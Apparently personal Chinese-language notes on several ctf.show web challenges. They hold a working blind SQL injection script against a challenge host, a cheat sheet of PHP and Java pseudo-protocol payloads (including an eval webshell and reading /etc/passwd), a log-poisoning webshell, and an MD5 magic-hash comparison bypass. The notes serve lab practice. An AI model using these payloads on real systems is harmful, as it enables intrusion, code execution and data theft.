---
title: "WEB"
lastmod: 2026-06-17T14:40:43+08:00
draft: false
---
# WEB

- [7](#7)
- [WEB](#web)
  * [1](#1)
  * [2](#2)
      - [1. PHP 伪协议（最常用）](#1-php-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%9C%80%E5%B8%B8%E7%94%A8)
      - [2. Java 相关伪协议](#2-java-%E7%9B%B8%E5%85%B3%E4%BC%AA%E5%8D%8F%E8%AE%AE)
      - [3. 其他场景伪协议](#3-%E5%85%B6%E4%BB%96%E5%9C%BA%E6%99%AF%E4%BC%AA%E5%8D%8F%E8%AE%AE)
  * [4](#4)

---

# 7

# WEB

## 1

![1764239919366-cfee6713-42ce-4656-8ef8-edc67f28536e.png](1764239919366-cfee6713-42ce-4656-8ef8-edc67f28536e-243476.png)

在源代码的注释里面，base64编码，直接解码就行了

## 2

提示说是sql注入

先打开看一下是什么东西

输入两个`1'or'1'='1`的时候会显示`欢迎你，ctfshower`

看起来可以布尔盲注一下，找一个板子直接连接掉

什么也没有过滤

```php
import requests
import string
import time

# 定义目标URL
url = "http://b088d3d2-dd5f-472e-8445-9497ed102655.challenge.ctf.show/"

# 定义可能的UUID字符集（保持原字符集）
# uuid_chars = string.ascii_lowercase + "-}{" + string.digits
uuid_chars = [chr(ascii_code) for ascii_code in range(128)]
# 初始化flag变量
flag = ""
# get="SELECT schema_name FROM information_schema.schemata"
# get="select group_concat(table_name) from information_schema.tables where table_schema=database()"
# get = "select group_concat(column_name) from information_schema.columns where table_name='flag'"
get = "select * from flag"
# 循环尝试获取flag的每一位字符（UUID长度通常为36，这里保留46次循环兼容更长场景）
for i in range(1, 46):
    # 遍历可能的字符
    for char in uuid_chars:
        # 构造SQL注入payload（适配POST参数，保持原有的ASCII截取逻辑）
        # payload = f"1'/**/and/**/ascii(substr((select/**/group_concat(password)/**/from/**/ctfshow_user/**/where/**/username='flag')/**/from/**/{i}/**/for/**/1))={ord(char)}--%20"
        
        # 构造POST请求参数（根据目标接口调整参数名，这里假设参数为id、page、limit）
        username=f"1'or(ord(substr(({get}),{i},1))={ord(char)})#"
        post_data = {
            "username": username,
            "password": "1'or'1'='1"
        }
        
        # 发送POST请求
        res = requests.post(url, data=post_data)
        # print(username)
        # 输出调试信息（可选）
        # print(f"尝试位置{i}字符{char}")  # 只打印前50字符避免刷屏
        
        # 检查响应中是否包含'admin'（保持原判断逻辑）
        if "欢迎你" in res.text:
            # 如果包含，则将该字符添加到flag中
            flag += char
            # 输出当前已获取到的flag
            print(f"[+] 找到字符: {char} | 当前flag: {flag}")
            # 跳出内层循环，尝试下一个位置的字符
            break
        # 可选：添加延迟避免请求过快
        # time.sleep(0.1)

# 最终输出完整flag
print("\n[+] 爆破完成，最终flag:", flag)

    # 1'and(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='a')#


    
```

3

```php

<?php include($_GET['url']);?>
```

看起来可以伪协议啊

#### <font style="color:rgb(0, 0, 0);">1. PHP 伪协议（最常用）</font>

* **php://filter**：核心用于读取源码，常配合「base64 编码」绕过文件内容限制，比如 `php://filter/read=convert.base64-encode/resource=flag.php`。
* **php://input**：接收 POST 原始数据，在允许 `allow_url_include=On` 时，可注入恶意代码执行，比如结合文件包含漏洞传入 `<?php eval($_POST['cmd']);?>`。
* **data://**：直接传递数据并解析为对应格式，支持代码执行，比如 `data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==`（base64 解码后为执行命令代码）。
* **phar://**：利用 Phar 文件的序列化特性，绕过文件后缀限制，触发反序列化漏洞，比如 `phar://test.zip/shell.php`（zip 包内藏恶意脚本）。
* **zip:///bzip2:///zlib://**：读取压缩包内文件，无需解压，比如 `zip://flag.zip%23flag.php`（%23 是 # 的 URL 编码，指定压缩包内文件）。

#### <font style="color:rgb(0, 0, 0);">2. Java 相关伪协议</font>

* **file://**：读取本地文件，比如 `file:///etc/passwd`（Linux）或 `file:///C:/Windows/system32/drivers/etc/hosts`（Windows）。
* **jar://**：读取 JAR 包内资源，配合文件包含或漏洞触发代码执行，比如 `jar:file:///tmp/test.jar!/shell.class`。
* **jrt://**：Java 9+ 特有的运行时类路径协议，可读取系统类文件，较少直接利用，但可能用于信息泄露。

#### <font style="color:rgb(0, 0, 0);">3. 其他场景伪协议</font>

* **dict://**：查询字典服务，多用于端口探测或信息泄露，比如 `dict://target:port/info`。
* **gopher://**：模拟 HTTP 请求或其他协议数据包，常用于 SSRF 漏洞中构造 POST 请求、注入恶意数据，比如伪造 MySQL 连接包执行命令。

直接php://input

可以读取POST中的内容，php语言中的POST和GET一般没有严格的分明。

flag在目录下的一个叫做ctf\_go\_go\_go的文件

## 4

直接抄上一道题目的payload会报错，发现不是很行的样子

先试一下`/etc/passwd`能不能通过

发现可以，说明可以访问默认地址的文件

所以可以访问日志，直接日志污染

`/var/log/nginx/access.log`这个地址是日志的地址

`<?php@eval($_POST[a]);?>`

注意用BP穿，因为直接hackbar传输的话会编码一次，啥也不能注入

5

```php
<?php
        $flag="";
        $v1=$_GET['v1'];
        $v2=$_GET['v2'];
        if(isset($v1) && isset($v2)){
            if(!ctype_alpha($v1)){
                die("v1 error");
            }
            if(!is_numeric($v2)){
                die("v2 error");
            }
            if(md5($v1)==md5($v2)){
                echo $flag;
            }
        }else{
        
            echo "where is flag?";
        }
    ?>

```

构造payload：<code><font style="color:rgb(33, 37, 41);">v1=QNKCDZO&v2=240610708</font></code><font style="color:rgb(33, 37, 41);">上传</font>

MD5 均以`0e`开头，后续字符全为数字。

在 PHP 中，`==` 比较时会将这类字符串解析为科学计数法（0 的任意次方仍为 0），导致哈希碰撞（如 `md5($a) == md5($b)` 成立）。

6

发现还是sql注入

1'or'1'='1可以注入

测试一下有没有什么过滤

好像是不能加空格的

7

不能用单引号，其他的和上一道题目差不多

但是别忘了可以用联合查询

